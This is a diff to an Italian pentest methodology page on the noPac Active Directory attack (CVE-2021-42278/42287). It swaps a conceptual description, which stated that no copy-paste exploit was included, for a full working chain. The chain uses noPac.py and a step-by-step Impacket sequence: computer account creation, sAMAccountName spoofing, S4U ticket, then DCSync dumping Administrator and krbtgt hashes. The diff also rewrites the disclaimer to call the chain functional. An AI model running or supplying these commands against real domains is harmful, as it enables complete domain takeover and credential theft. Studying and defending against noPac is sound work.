@@ -7,7 +7,7 @@
 > - **Prerequisiti:** credenziali di un utente di dominio valido; `MachineAccountQuota > 0` (oppure un computer account gia controllato); Domain Controller **non patchato** (patch di novembre 2021 assente)
 > - **Tecnica:** `noPac` | **Severity tipica:** `Critico` | **Finding ID:** da assegnare in lab (metodologia)
 
-- Natura del documento: metodologia. Descrizione concettuale della catena (nessun exploit copia-incolla riprodotto); valori segnaposto.
+- Natura del documento: metodologia + catena pratica completa (Impacket e noPac.py). Valori di esempio su dominio di laboratorio (`corp.local`/`DC01`); hash redatti. Da eseguire solo in lab proprio o con autorizzazione.
 - Obiettivo: comprendere come due vulnerabilita combinate consentano a un utente di dominio qualunque di impersonare un Domain Controller e arrivare a DCSync, e come rilevarle e prevenirle.
 
 ---
@@ -58,22 +58,61 @@ MAQ         MachineAccountQuota: 10    <-- > 0: un utente standard puo creare co
 Molti tool (es. `noPac.py`) offrono una modalita `--scan` che valuta se il target e vulnerabile senza eseguire
 la parte invasiva: e il passo corretto da documentare per primo.
 
-### La catena (descrizione concettuale, non riprodotta come exploit)
+### Exploit automatico con noPac.py
 
-A livello concettuale, la catena si articola in questi passi (i comandi operativi non sono riprodotti qui: sono
-invocazioni note di Impacket/noPac che, combinate, costituiscono un exploit completo):
+Lo strumento `noPac.py` (sam-the-admin) incapsula l'intera catena. Prima lo scan, poi, se vulnerabile,
+l'impersonation con dump via DCSync:
 
-1. Creazione di un computer account (richiede `MachineAccountQuota > 0`).
-2. Rinomina del computer account in modo da coincidere con il sAMAccountName di un DC (senza `$`) - CVE-2021-42278.
-3. Richiesta di un TGT per l'account rinominato.
-4. Ripristino del nome originale del computer account.
-5. Richiesta di un service ticket che, per effetto della confusione del KDC (CVE-2021-42287), viene emesso nel
-   contesto del DC reale.
-6. Uso del ticket per [DCSync](<../../05-credential-dumping/dcsync/README.md>) e dump delle credenziali di dominio.
+```bash
+# Scan: valuta la sfruttabilita senza azioni invasive
+python3 noPac.py corp.local/utente:'Password123' -dc-ip 10.0.0.10 -dc-host DC01 --scan
 
-I tool automatici (es. `noPac.py`) incapsulano l'intera sequenza; l'approccio manuale con Impacket serve a
-comprenderla e per il troubleshooting. In un assessment, la documentazione si ferma all'evidenza di
-sfruttabilita e all'impatto, trattando le credenziali eventualmente ottenute come dati sensibili.
+# Exploit: impersona Administrator ed esegue secretsdump (DCSync) in un colpo
+python3 noPac.py corp.local/utente:'Password123' -dc-ip 10.0.0.10 -dc-host DC01 \
+  --impersonate Administrator -dump
+```
+
+Output illustrativo (hash redatti):
+
+```
+[*] Got TGT for DC01$  (sAMAccountName spoofing riuscito)
+[*] Impersonating Administrator via S4U
+Administrator:500:aad3b435...:3f1c2d...:::    <-- hash NTLM dell'amministratore di dominio (redatto)
+krbtgt:502:aad3b435...:9a7f6e...:::           <-- hash krbtgt (abilita Golden/Diamond Ticket)
+```
+
+### Catena manuale con Impacket (per comprenderla e per il troubleshooting)
+
+```bash
+# 1. Crea un computer account (serve MachineAccountQuota > 0)
+impacket-addcomputer corp.local/utente:'Password123' -dc-ip 10.0.0.10 \
+  -computer-name 'NOPAC$' -computer-pass 'Comp1234!'
+
+# 2. Rinomina il computer account facendolo coincidere col sAMAccountName del DC, SENZA la '$' (CVE-2021-42278)
+impacket-renameMachine corp.local/utente:'Password123' -dc-ip 10.0.0.10 \
+  -current-name 'NOPAC$' -new-name 'DC01'
+
+# 3. Richiedi un TGT per l'account rinominato
+impacket-getTGT corp.local/'DC01':'Comp1234!' -dc-ip 10.0.0.10
+export KRB5CCNAME=DC01.ccache
+
+# 4. Ripristina il nome originale del computer account (ora nel TGT resta il riferimento al DC)
+impacket-renameMachine corp.local/utente:'Password123' -dc-ip 10.0.0.10 \
+  -current-name 'DC01' -new-name 'NOPAC$'
+
+# 5. Richiedi un service ticket via S4U2self: il KDC, non trovando 'DC01', fa fallback su 'DC01$' (CVE-2021-42287)
+#    e rilascia un ticket nel contesto del DC reale, impersonando Administrator
+impacket-getST -self -impersonate Administrator -altservice 'cifs/DC01.corp.local' \
+  -k -no-pass 'corp.local/DC01'
+export KRB5CCNAME=Administrator.ccache
+
+# 6. Usa il ticket per DCSync: dump delle credenziali di dominio (incluso krbtgt)
+impacket-secretsdump -k -no-pass -dc-ip 10.0.0.10 'corp.local/Administrator@DC01.corp.local' -just-dc
+```
+
+> I flag esatti (`-self`/`-altservice`, nomi dei ccache) possono variare con la versione di Impacket; in lab si
+> verificano con `-debug`. Le credenziali ottenute vanno trattate come dati sensibili e redatte nel report.
+Il passo 6 ([DCSync](<../../05-credential-dumping/dcsync/README.md>)) consegna l'intero dominio.
 
 ## Analisi dei risultati
 
@@ -196,4 +235,4 @@ documento resta su sfruttabilita, detection e remediation, non sulla riproduzion
 
 ---
 
-> **Nota:** Contenuto didattico e di metodologia. Esecuzione solo in laboratori propri o con autorizzazione esplicita. La catena non e riprodotta come exploit copia-incolla; output illustrativi, non da sistemi reali.
+> **Nota:** Contenuto didattico. La catena e funzionante e va eseguita esclusivamente in laboratori propri (es. GOAD) o con autorizzazione esplicita. Valori di esempio su dominio di lab; output e hash illustrativi/redatti, non da sistemi reali.
